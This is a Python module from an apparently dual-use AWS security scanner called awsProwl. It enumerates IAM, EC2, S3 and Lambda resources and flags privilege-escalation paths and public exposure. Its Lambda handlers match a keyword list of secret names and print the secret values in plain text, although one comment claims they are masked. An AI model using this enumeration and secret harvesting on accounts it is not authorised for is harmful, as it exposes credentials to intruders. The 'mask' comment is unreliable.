"""Module handlers for awsProwl TUI - connects modules to actual AWS scanners."""

from __future__ import annotations

import asyncio
import botocore.exceptions
import csv
import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable

from rich.console import Console

from awsprowl.aws.iam import IAMScanner
from awsprowl.aws.ec2 import EC2Scanner
from awsprowl.aws.s3 import S3Scanner
from awsprowl.aws.lambda_ import LambdaScanner
from awsprowl.aws.ecs import ECSScanner
from awsprowl.aws.secrets import SecretsScanner
from awsprowl.aws.sns import SNSScanner
from awsprowl.aws.beanstalk import BeanstalkScanner
from awsprowl.aws.cognito import CognitoScanner
from awsprowl.aws.sts import STSScanner
from awsprowl.aws.rds import RDSScanner
from awsprowl.aws.dynamodb import DynamoDBScanner
from awsprowl.aws.cloudfront import CloudFrontScanner
from awsprowl.aws.kms import KMSScanner
from awsprowl.aws.eks import EKSScanner
from awsprowl.core.auth import AWSAuthManager
from awsprowl.aws.base import ScanResult
from awsprowl.cli.ui.prowl_display import ProwlDisplay
from awsprowl.core.config import get_config
from awsprowl.core.logging import get_logger

log = get_logger(__name__)


def _create_scan_result(service: str, region: str = "global") -> ScanResult:
    """Create a ScanResult for internal scanner calls."""
    return ScanResult(service=service, region=region)


def _handle_aws_error(operation: str, error: Exception) -> list[dict]:
    """Handle AWS errors and return a clean finding for permission issues."""
    if isinstance(error, botocore.exceptions.ClientError):
        error_code = error.response.get("Error", {}).get("Code", "")
        if error_code in ("AccessDenied", "UnauthorizedOperation", "AuthFailure"):
            return [{
                "title": f"Access Denied: {operation}",
                "description": f"Not authorized to perform {operation}. Required permissions are missing.",
                "severity": "info",
                "category": "informational",
                "resource_type": "aws_permission",
                "resource_id": operation,
                "resource_name": operation,
                "region": "global",
                "rule_id": f"access_denied_{operation.lower().replace(' ', '_')}",
            }]
    # For other errors, log and return empty
    log.debug("Error in %s: %s", operation, error)
    return []


async def run_iam_check_mfa(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check MFA status for all IAM users."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_users("tui-mfa-check", findings, _create_scan_result("iam"))
    # Filter to only MFA findings
    mfa_findings = [f for f in findings if f.get("rule_id") == "iam_mfa_not_enabled"]
    return mfa_findings


async def run_iam_check_access_keys(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check access key age and rotation for all IAM users."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_users("tui-access-key-check", findings, _create_scan_result("iam"))
    # Filter to only access key findings
    key_findings = [f for f in findings if f.get("rule_id") == "iam_old_access_key"]
    return key_findings


async def run_iam_check_wildcard_policies(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Find overly permissive IAM policies."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_policies("tui-wildcard-policy-check", findings, _create_scan_result("iam"))
    await scanner._scan_users("tui-wildcard-policy-check", findings, _create_scan_result("iam"))
    await scanner._scan_roles("tui-wildcard-policy-check", findings, _create_scan_result("iam"))
    await scanner._scan_groups("tui-wildcard-policy-check", findings, _create_scan_result("iam"))
    # Filter to only wildcard policy findings
    wildcard_findings = [f for f in findings if f.get("rule_id", "").startswith("iam_wildcard")]
    return wildcard_findings


async def run_iam_check_cross_account_trust(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Find cross-account role trust relationships."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_roles("tui-cross-account-check", findings, _create_scan_result("iam"))
    # Filter to only cross-account findings
    cross_account_findings = [f for f in findings if f.get("rule_id") == "iam_cross_account_trust"]
    return cross_account_findings


async def run_iam_check_privilege_escalation(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check for privilege escalation paths."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_users("tui-privesc-check", findings, _create_scan_result("iam"))
    await scanner._scan_roles("tui-privesc-check", findings, _create_scan_result("iam"))
    await scanner._scan_policies("tui-privesc-check", findings, _create_scan_result("iam"))
    await scanner._scan_groups("tui-privesc-check", findings, _create_scan_result("iam"))
    # Filter to privilege escalation findings
    privesc_findings = [f for f in findings if f.get("category") == "privilege_escalation"]
    return privesc_findings


async def run_iam_list_users(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all IAM users."""
    scanner = IAMScanner(auth_manager)
    users = []
    try:
        paginator = scanner.client.get_paginator("list_users")
        for page in paginator.paginate():
            for user in page.get("Users", []):
                users.append({
                    "title": f"IAM User: {user['UserName']}",
                    "description": f"User ARN: {user['Arn']}, Created: {user['CreateDate']}",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "iam_user",
                    "resource_id": user["UserName"],
                    "resource_name": user["UserName"],
                    "region": "global",
                    "rule_id": "iam_list_users",
                })
    except Exception as e:
        return _handle_aws_error("iam:ListUsers", e)
    return users


async def run_iam_list_roles(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all IAM roles."""
    scanner = IAMScanner(auth_manager)
    roles = []
    try:
        paginator = scanner.client.get_paginator("list_roles")
        for page in paginator.paginate():
            for role in page.get("Roles", []):
                if not role.get("Path", "").startswith("/aws-service-role/"):
                    roles.append({
                        "title": f"IAM Role: {role['RoleName']}",
                        "description": f"Role ARN: {role['Arn']}, Path: {role.get('Path', '/')}",
                        "severity": "info",
                        "category": "informational",
                        "resource_type": "iam_role",
                        "resource_id": role["RoleName"],
                        "resource_name": role["RoleName"],
                        "region": "global",
                        "rule_id": "iam_list_roles",
                    })
    except Exception as e:
        return _handle_aws_error("iam:ListRoles", e)
    return roles


async def run_iam_list_policies(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all IAM policies."""
    scanner = IAMScanner(auth_manager)
    policies = []
    try:
        paginator = scanner.client.get_paginator("list_policies")
        for page in paginator.paginate(Scope="Local"):
            for policy in page.get("Policies", []):
                policies.append({
                    "title": f"IAM Policy: {policy['PolicyName']}",
                    "description": f"Policy ARN: {policy['Arn']}, Attached: {policy.get('AttachmentCount', 0)} entities",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "iam_policy",
                    "resource_id": policy["PolicyName"],
                    "resource_name": policy["PolicyName"],
                    "region": "global",
                    "rule_id": "iam_list_policies",
                })
    except Exception as e:
        return _handle_aws_error("iam:ListPolicies", e)
    return policies


async def run_iam_list_groups(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all IAM groups."""
    scanner = IAMScanner(auth_manager)
    groups = []
    try:
        paginator = scanner.client.get_paginator("list_groups")
        for page in paginator.paginate():
            for group in page.get("Groups", []):
                groups.append({
                    "title": f"IAM Group: {group['GroupName']}",
                    "description": f"Group ARN: {group['Arn']}, Path: {group.get('Path', '/')}",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "iam_group",
                    "resource_id": group["GroupName"],
                    "resource_name": group["GroupName"],
                    "region": "global",
                    "rule_id": "iam_list_groups",
                })
    except Exception as e:
        return _handle_aws_error("iam:ListGroups", e)
    return groups


async def run_ec2_check_imds(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check IMDSv1/v2 configuration on EC2 instances."""
    scanner = EC2Scanner(auth_manager)
    findings = []
    await scanner._scan_instances("tui-imds-check", findings, _create_scan_result("iam"))
    # Filter to only IMDS findings
    imds_findings = [f for f in findings if f.get("rule_id") == "ec2_imdsv1_enabled"]
    return imds_findings


async def run_ec2_check_public_ips(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Find instances with public IPs."""
    scanner = EC2Scanner(auth_manager)
    findings = []
    await scanner._scan_instances("tui-public-ip-check", findings, _create_scan_result("iam"))
    # Filter to only public IP findings
    public_ip_findings = [f for f in findings if f.get("rule_id") == "ec2_public_ip"]
    return public_ip_findings


async def run_ec2_check_open_ports(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Find security groups with open ports."""
    scanner = EC2Scanner(auth_manager)
    findings = []
    await scanner._scan_security_groups("tui-open-ports-check", findings, _create_scan_result("iam"))
    await scanner._scan_nacls("tui-open-ports-check", findings, _create_scan_result("iam"))
    # Filter to network exposure findings
    exposure_findings = [f for f in findings if f.get("category") == "network_exposure"]
    return exposure_findings


async def run_ec2_check_unencrypted_volumes(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Find unencrypted EBS volumes."""
    scanner = EC2Scanner(auth_manager)
    findings = []
    await scanner._scan_volumes("tui-unencrypted-volumes-check", findings, _create_scan_result("iam"))
    await scanner._scan_snapshots("tui-unencrypted-volumes-check", findings, _create_scan_result("iam"))
    # Filter to encryption missing findings
    enc_findings = [f for f in findings if f.get("category") == "encryption_missing"]
    return enc_findings


async def run_ec2_list_instances(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all EC2 instances with detailed info (Prowl-style)."""
    scanner = EC2Scanner(auth_manager)
    instances = []
    try:
        paginator = scanner.client.get_paginator("describe_instances")
        for page in paginator.paginate():
            for reservation in page.get("Reservations", []):
                for instance in reservation.get("Instances", []):
                    state = instance.get("State", {}).get("Name", "unknown")
                    instance_id = instance["InstanceId"]
                    instance_type = instance.get("InstanceType", "N/A")
                    public_ip = instance.get("PublicIpAddress", "None")
                    private_ip = instance.get("PrivateIpAddress", "None")
                    vpc_id = instance.get("VpcId", "N/A")
                    subnet_id = instance.get("SubnetId", "N/A")
                    az = instance.get("Placement", {}).get("AvailabilityZone", "N/A")
                    iam_profile = instance.get("IamInstanceProfile", {}).get("Arn", "None")

                    # Get security groups
                    sgs = instance.get("SecurityGroups", [])
                    sg_info = ", ".join([f"{sg['GroupName']}({sg['GroupId']})" for sg in sgs]) if sgs else "None"

                    # Get tags
                    tags = instance.get("Tags", [])
                    name_tag = next((t["Value"] for t in tags if t["Key"] == "Name"), instance_id)

                    # Build description
                    desc_parts = [
                        f"State: {state}",
                        f"Type: {instance_type}",
                        f"AZ: {az}",
                        f"VPC: {vpc_id}",
                        f"Subnet: {subnet_id}",
                        f"Public IP: {public_ip}",
                        f"Private IP: {private_ip}",
                        f"Security Groups: {sg_info}",
                        f"IAM Profile: {iam_profile}",
                    ]

                    # Check for public IP exposure
                    if public_ip != "None":
                        desc_parts.append("[!] PUBLIC IP EXPOSURE")

                    instances.append({
                        "title": f"EC2 Instance: {instance_id} ({name_tag})",
                        "description": "\n".join(desc_parts),
                        "severity": "info" if public_ip == "None" else "medium",
                        "category": "informational" if public_ip == "None" else "network_exposure",
                        "resource_type": "ec2_instance",
                        "resource_id": instance_id,
                        "resource_name": name_tag,
                        "region": scanner.region,
                        "rule_id": "ec2_list_instances",
                    })
    except Exception as e:
        return _handle_aws_error("ec2:DescribeInstances", e)
    return instances


async def run_ec2_list_security_groups(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all security groups."""
    scanner = EC2Scanner(auth_manager)
    sgs = []
    try:
        paginator = scanner.client.get_paginator("describe_security_groups")
        for page in paginator.paginate():
            for sg in page.get("SecurityGroups", []):
                sgs.append({
                    "title": f"Security Group: {sg['GroupId']} ({sg['GroupName']})",
                    "description": f"VPC: {sg.get('VpcId', 'N/A')}, Description: {sg.get('Description', 'N/A')}",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "ec2_security_group",
                    "resource_id": sg["GroupId"],
                    "resource_name": sg["GroupName"],
                    "region": scanner.region,
                    "rule_id": "ec2_list_security_groups",
                })
    except Exception as e:
        return _handle_aws_error("ec2:DescribeSecurityGroups", e)
    return sgs


async def run_ec2_list_vpcs(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all VPCs."""
    scanner = EC2Scanner(auth_manager)
    vpcs = []
    try:
        paginator = scanner.client.get_paginator("describe_vpcs")
        for page in paginator.paginate():
            for vpc in page.get("Vpcs", []):
                vpcs.append({
                    "title": f"VPC: {vpc['VpcId']}",
                    "description": f"CIDR: {vpc.get('CidrBlock', 'N/A')}, Default: {vpc.get('IsDefault', False)}, State: {vpc.get('State', 'N/A')}",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "vpc",
                    "resource_id": vpc["VpcId"],
                    "resource_name": vpc["VpcId"],
                    "region": scanner.region,
                    "rule_id": "ec2_list_vpcs",
                })
    except Exception as e:
        return _handle_aws_error("ec2:DescribeVpcs", e)
    return vpcs


async def run_ec2_list_subnets(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all subnets."""
    scanner = EC2Scanner(auth_manager)
    subnets = []
    try:
        paginator = scanner.client.get_paginator("describe_subnets")
        for page in paginator.paginate():
            for subnet in page.get("Subnets", []):
                subnets.append({
                    "title": f"Subnet: {subnet['SubnetId']}",
                    "description": f"VPC: {subnet.get('VpcId', 'N/A')}, CIDR: {subnet.get('CidrBlock', 'N/A')}, AZ: {subnet.get('AvailabilityZone', 'N/A')}",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "subnet",
                    "resource_id": subnet["SubnetId"],
                    "resource_name": subnet["SubnetId"],
                    "region": scanner.region,
                    "rule_id": "ec2_list_subnets",
                })
    except Exception as e:
        return _handle_aws_error("ec2:DescribeSubnets", e)
    return subnets


async def run_ec2_list_keypairs(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all key pairs."""
    scanner = EC2Scanner(auth_manager)
    keypairs = []
    try:
        response = scanner.client.describe_key_pairs()
        for key in response.get("KeyPairs", []):
            keypairs.append({
                "title": f"Key Pair: {key['KeyName']}",
                "description": f"Type: {key.get('KeyType', 'rsa')}, Format: {key.get('KeyFormat', 'pem')}, Created: {key.get('CreateTime', 'N/A')}",
                "severity": "info",
                "category": "informational",
                "resource_type": "key_pair",
                "resource_id": key["KeyName"],
                "resource_name": key["KeyName"],
                "region": scanner.region,
                "rule_id": "ec2_list_keypairs",
            })
    except Exception as e:
        return _handle_aws_error("ec2:DescribeKeyPairs", e)
    return keypairs


async def run_ec2_check_instance_profiles(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check instance profile permissions."""
    scanner = EC2Scanner(auth_manager)
    findings = []
    await scanner._scan_instances("tui-instance-profile-check", findings, _create_scan_result("iam"))
    # Filter to instance profile related findings
    profile_findings = [f for f in findings if "instance_profile" in f.get("rule_id", "").lower() or "iam" in f.get("resource_type", "").lower()]
    return profile_findings


async def run_s3_check_public_access(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check for public bucket access."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-s3-public-check", findings)
    # Filter to public access findings
    public_findings = [f for f in findings if f.get("category") in ("data_exposure", "weak_configuration") and "public" in f.get("rule_id", "").lower()]
    return public_findings


async def run_s3_check_encryption(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check bucket encryption."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-s3-encryption-check", findings)
    # Filter to encryption findings
    enc_findings = [f for f in findings if f.get("category") == "encryption_missing"]
    return enc_findings


async def run_s3_check_versioning(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check bucket versioning."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-s3-versioning-check", findings)
    # Filter to versioning findings
    ver_findings = [f for f in findings if f.get("rule_id") == "s3_versioning_disabled"]
    return ver_findings


async def run_s3_check_logging(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check bucket access logging."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-s3-logging-check", findings)
    # Filter to logging findings
    log_findings = [f for f in findings if f.get("rule_id") == "s3_logging_disabled"]
    return log_findings


async def run_s3_check_policies(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check bucket policies."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-s3-policy-check", findings)
    # Filter to policy findings
    policy_findings = [f for f in findings if "policy" in f.get("rule_id", "").lower()]
    return policy_findings


async def run_s3_check_acls(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check bucket ACLs."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-s3-acl-check", findings)
    # Filter to ACL findings
    acl_findings = [f for f in findings if "acl" in f.get("rule_id", "").lower()]
    return acl_findings


async def run_s3_list_buckets(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all S3 buckets with detailed info (Prowl-style)."""
    scanner = S3Scanner(auth_manager)
    buckets = []
    try:
        response = scanner.client.list_buckets()
        for bucket in response.get("Buckets", []):
            bucket_name = bucket["Name"]

            # Get bucket location (region)
            bucket_region = "us-east-1"
            try:
                location = scanner.client.get_bucket_location(Bucket=bucket_name)
                bucket_region = location.get("LocationConstraint") or "us-east-1"
            except Exception:
                pass

            # Check encryption
            encryption_info = "Not configured"
            try:
                enc = scanner.client.get_bucket_encryption(Bucket=bucket_name)
                rules = enc.get("ServerSideEncryptionConfiguration", [])
                if rules:
                    encryption_info = ", ".join([r.get("ApplyServerSideEncryptionByDefault", {}).get("SSEAlgorithm", "AES256") for r in rules])
            except Exception as e:
                if "ServerSideEncryptionConfigurationNotFoundError" not in str(e):
                    encryption_info = f"Error: {e}"

            # Check versioning
            versioning_info = "Disabled"
            try:
                ver = scanner.client.get_bucket_versioning(Bucket=bucket_name)
                if ver.get("Status") == "Enabled":
                    versioning_info = "Enabled"
                elif ver.get("Status") == "Suspended":
                    versioning_info = "Suspended"
            except Exception:
                pass

            # Check public access block
            public_access_info = "Not configured"
            try:
                pab = scanner.client.get_public_access_block(Bucket=bucket_name)
                config = pab.get("PublicAccessBlockConfiguration", {})
                blocks = []
                if config.get("BlockPublicAcls"):
                    blocks.append("BlockPublicAcls")
                if config.get("IgnorePublicAcls"):
                    blocks.append("IgnorePublicAcls")
                if config.get("BlockPublicPolicy"):
                    blocks.append("BlockPublicPolicy")
                if config.get("RestrictPublicBuckets"):
                    blocks.append("RestrictPublicBuckets")
                if blocks:
                    public_access_info = ", ".join(blocks)
                else:
                    public_access_info = "None (PUBLIC ACCESS ALLOWED)"
            except Exception as e:
                if "NoSuchPublicAccessBlockConfiguration" not in str(e):
                    public_access_info = f"Error: {e}"
                else:
                    public_access_info = "None (PUBLIC ACCESS ALLOWED)"

            # Check logging
            logging_info = "Disabled"
            try:
                log = scanner.client.get_bucket_logging(Bucket=bucket_name)
                if log.get("LoggingEnabled"):
                    logging_info = f"Enabled -> {log['LoggingEnabled'].get('TargetBucket', 'N/A')}/{log['LoggingEnabled'].get('TargetPrefix', '')}"
            except Exception:
                pass

            # Check policy
            policy_info = "None"
            try:
                policy = scanner.client.get_bucket_policy(Bucket=bucket_name)
                if policy.get("Policy"):
                    policy_info = "Exists"
            except Exception as e:
                if "NoSuchBucketPolicy" not in str(e):
                    policy_info = f"Error: {e}"

            # Build description
            desc_parts = [
                f"Region: {bucket_region}",
                f"Created: {bucket.get('CreationDate', 'N/A')}",
                f"Encryption: {encryption_info}",
                f"Versioning: {versioning_info}",
                f"Public Access Block: {public_access_info}",
                f"Access Logging: {logging_info}",
                f"Bucket Policy: {policy_info}",
            ]

            # Check for public exposure
            severity = "info"
            category = "informational"
            if "PUBLIC ACCESS ALLOWED" in public_access_info:
                severity = "high"
                category = "data_exposure"
                desc_parts.append("[!] PUBLIC ACCESS ALLOWED - Bucket may be publicly accessible")

            buckets.append({
                "title": f"S3 Bucket: {bucket_name}",
                "description": "\n".join(desc_parts),
                "severity": severity,
                "category": category,
                "resource_type": "s3_bucket",
                "resource_id": bucket_name,
                "resource_name": bucket_name,
                "region": bucket_region,
                "rule_id": "s3_list_buckets",
            })
    except Exception as e:
        return _handle_aws_error("s3:ListBuckets", e)
    return buckets


async def run_s3_list_objects(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List objects in bucket (first bucket)."""
    scanner = S3Scanner(auth_manager)
    objects = []
    try:
        response = scanner.client.list_buckets()
        buckets = response.get("Buckets", [])
        if buckets:
            bucket_name = buckets[0]["Name"]
            paginator = scanner.client.get_paginator("list_objects_v2")
            for page in paginator.paginate(Bucket=bucket_name, MaxKeys=100):
                for obj in page.get("Contents", []):
                    objects.append({
                        "title": f"S3 Object: {obj['Key']}",
                        "description": f"Bucket: {bucket_name}, Size: {obj.get('Size', 0)} bytes, Modified: {obj.get('LastModified', 'N/A')}",
                        "severity": "info",
                        "category": "informational",
                        "resource_type": "s3_object",
                        "resource_id": obj["Key"],
                        "resource_name": obj["Key"],
                        "region": scanner.region,
                        "rule_id": "s3_list_objects",
                    })
    except Exception as e:
        return _handle_aws_error("s3:ListObjects", e)
    return objects


async def run_lambda_check_runtime(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check for deprecated runtimes."""
    scanner = LambdaScanner(auth_manager)
    findings = []
    await scanner._scan_functions("tui-lambda-runtime-check", findings, _create_scan_result("iam"))
    # Filter to runtime findings
    runtime_findings = [f for f in findings if f.get("rule_id") == "lambda_deprecated_runtime"]
    return runtime_findings


async def run_lambda_check_permissions(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check function permissions/policies."""
    scanner = LambdaScanner(auth_manager)
    findings = []
    await scanner._scan_functions("tui-lambda-permissions-check", findings, _create_scan_result("iam"))
    # Filter to policy/public access findings
    perm_findings = [f for f in findings if "policy" in f.get("rule_id", "").lower() or "cross_account" in f.get("rule_id", "").lower()]
    return perm_findings


async def run_lambda_check_env_vars(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check environment variables for secrets - Prowl style detailed output."""
    scanner = LambdaScanner(auth_manager)
    all_findings = []
    try:
        paginator = scanner.client.get_paginator("list_functions")
        for page in paginator.paginate():
            for func in page.get("Functions", []):
                function_name = func["FunctionName"]

                # Get function configuration with environment variables
                try:
                    config = scanner.client.get_function_configuration(FunctionName=function_name)
                    env_vars = config.get("Environment", {}).get("Variables", {})

                    if not env_vars:
                        continue

                    secret_keywords = [
                        "password", "secret", "key", "token", "api_key", "apikey",
                        "access_key", "secret_key", "private_key", "cert",
                        "connection_string", "conn_string", "database_url", "db_password",
                    ]

                    has_secrets = False
                    for key, value in env_vars.items():
                        if any(kw in key.lower() for kw in secret_keywords):
                            has_secrets = True
                            all_findings.append({
                                "title": f"[SECRET] {function_name}: {key}",
                                "description": f"Environment variable {key} contains sensitive data\n  Value: {value}",
                                "severity": "high",
                                "category": "secrets_exposure",
                                "resource_type": "lambda_function",
                                "resource_id": function_name,
                                "resource_name": function_name,
                                "region": scanner.region,
                                "rule_id": "lambda_env_var_secret",
                            })

                    if not has_secrets and env_vars:
                        # Show non-secret env vars as info
                        for key, value in env_vars.items():
                            all_findings.append({
                                "title": f"[ENV] {function_name}: {key}",
                                "description": f"Environment variable: {key} = {value}",
                                "severity": "info",
                                "category": "informational",
                                "resource_type": "lambda_function",
                                "resource_id": function_name,
                                "resource_name": function_name,
                                "region": scanner.region,
                                "rule_id": "lambda_env_var_info",
                            })

                except Exception as e:
                    # Handle permission errors like Prowl does
                    all_findings.append({
                        "title": f"Lambda Function: {function_name} - PERMISSION ERROR",
                        "description": f"Failed to get function configuration: {str(e)}",
                        "severity": "info",
                        "category": "informational",
                        "resource_type": "lambda_function",
                        "resource_id": function_name,
                        "resource_name": function_name,
                        "region": scanner.region,
                        "rule_id": "lambda_permission_error",
                    })
    except Exception as e:
        return _handle_aws_error("lambda:ListFunctions", e)
    return all_findings


async def run_lambda_list_functions(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List all Lambda functions with basic info (runtime, memory, timeout, VPC)."""
    scanner = LambdaScanner(auth_manager)
    functions = []
    try:
        paginator = scanner.client.get_paginator("list_functions")
        for page in paginator.paginate():
            for func in page.get("Functions", []):
                function_name = func["FunctionName"]

                # Build description with basic runtime info only
                desc_parts = [
                    f"Runtime: {func.get('Runtime', 'N/A')}",
                    f"Memory: {func.get('MemorySize', 'N/A')}MB",
                    f"Timeout: {func.get('Timeout', 'N/A')}s",
                ]

                # Check for VPC config
                vpc_config = func.get("VpcConfig", {})
                if vpc_config.get("VpcId"):
                    desc_parts.append(f"VPC: {vpc_config.get('VpcId')}")

                functions.append({
                    "title": f"Lambda Function: {function_name}",
                    "description": "\n".join(desc_parts),
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "lambda_function",
                    "resource_id": function_name,
                    "resource_name": function_name,
                    "region": scanner.region,
                    "rule_id": "lambda_list_functions",
                })
    except Exception as e:
        return _handle_aws_error("lambda:ListFunctions", e)
    return functions


async def run_lambda_list_functions_detailed(auth_manager: AWSAuthManager, region: str = None, **kwargs) -> list[dict]:
    """List all Lambda functions with detailed info including environment variables (for scan-all)."""
    scanner = LambdaScanner(auth_manager, region=region)
    functions = []
    try:
        paginator = scanner.client.get_paginator("list_functions")
        for page in paginator.paginate():
            for func in page.get("Functions", []):
                function_name = func["FunctionName"]

                # Get detailed function configuration (includes environment variables)
                env_vars = {}
                perm_error = None
                try:
                    config = scanner.client.get_function_configuration(FunctionName=function_name)
                    env_vars = config.get("Environment", {}).get("Variables", {})
                except Exception as e:
                    perm_error = str(e)

                # Build description with runtime info
                desc_parts = [
                    f"Runtime: {func.get('Runtime', 'N/A')}",
                    f"Memory: {func.get('MemorySize', 'N/A')}MB",
                    f"Timeout: {func.get('Timeout', 'N/A')}s",
                ]

                # Add environment variables info
                if env_vars:
                    desc_parts.append(f"Environment Variables: {len(env_vars)}")
                    # Show env var keys (like Prowl does)
                    for key, value in env_vars.items():
                        # Mask sensitive values
                        if any(kw in key.lower() for kw in ["password", "secret", "key", "token", "api_key", "apikey", "access_key", "secret_key", "private_key", "cert", "connection_string", "conn_string", "database_url", "db_password"]):
                            desc_parts.append(f"  [+] Secret (ENV): {key}= {value}")
                        else:
                            desc_parts.append(f"  {key}= {value}")
                elif perm_error:
                    desc_parts.append(f"  FAILURE: {perm_error}")

                # Check for VPC config
                vpc_config = func.get("VpcConfig", {})
                if vpc_config.get("VpcId"):
                    desc_parts.append(f"VPC: {vpc_config.get('VpcId')}")

                functions.append({
                    "title": f"Lambda Function: {function_name} ({function_name})",
                    "description": "\n".join(desc_parts),
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "lambda_function",
                    "resource_id": function_name,
                    "resource_name": function_name,
                    "region": scanner.region,
                    "rule_id": "lambda_list_functions_detailed",
                })
    except Exception as e:
        return _handle_aws_error("lambda:ListFunctions", e)
    return functions


async def run_lambda_check_layers(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check Lambda layers."""
    scanner = LambdaScanner(auth_manager)
    findings = []
    await scanner._scan_layers("tui-lambda-layers-check", findings, _create_scan_result("iam"))
    return findings


async def run_lambda_check_vpc_config(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check VPC configuration."""
    scanner = LambdaScanner(auth_manager)
    findings = []
    await scanner._scan_functions("tui-lambda-vpc-check", findings, _create_scan_result("iam"))
    # Filter to VPC findings
    vpc_findings = [f for f in findings if "vpc" in f.get("rule_id", "").lower() or "tracing" in f.get("rule_id", "").lower() or "concurrency" in f.get("rule_id", "").lower()]
    return vpc_findings


# Generic full scan handlers for each service
async def run_full_iam_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full IAM scan."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-iam-scan", findings)
    return findings


async def run_full_ec2_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full EC2 scan."""
    scanner = EC2Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-ec2-scan", findings)
    return findings


async def run_full_s3_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full S3 scan."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-s3-scan", findings)
    return findings


async def run_full_lambda_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full Lambda scan - list all functions with detailed info including env vars."""
    # Use the detailed listing function to show all functions with env vars
    return await run_lambda_list_functions_detailed(auth_manager, **kwargs)


async def run_full_ecs_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full ECS scan."""
    scanner = ECSScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-ecs-scan", findings)
    return findings


async def run_full_secretsmanager_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full Secrets Manager scan."""
    scanner = SecretsScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-secretsmanager-scan", findings)
    return findings


async def run_full_sns_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full SNS scan."""
    scanner = SNSScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-sns-scan", findings)
    return findings


async def run_full_beanstalk_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full Elastic Beanstalk scan."""
    scanner = BeanstalkScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-beanstalk-scan", findings)
    return findings


async def run_full_cognito_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full Cognito scan."""
    scanner = CognitoScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-cognito-scan", findings)
    return findings


async def run_full_sts_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full STS scan."""
    scanner = STSScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-sts-scan", findings)
    return findings


async def run_full_rds_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full RDS scan."""
    scanner = RDSScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-rds-scan", findings)
    return findings


async def run_full_dynamodb_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full DynamoDB scan."""
    scanner = DynamoDBScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-dynamodb-scan", findings)
    return findings


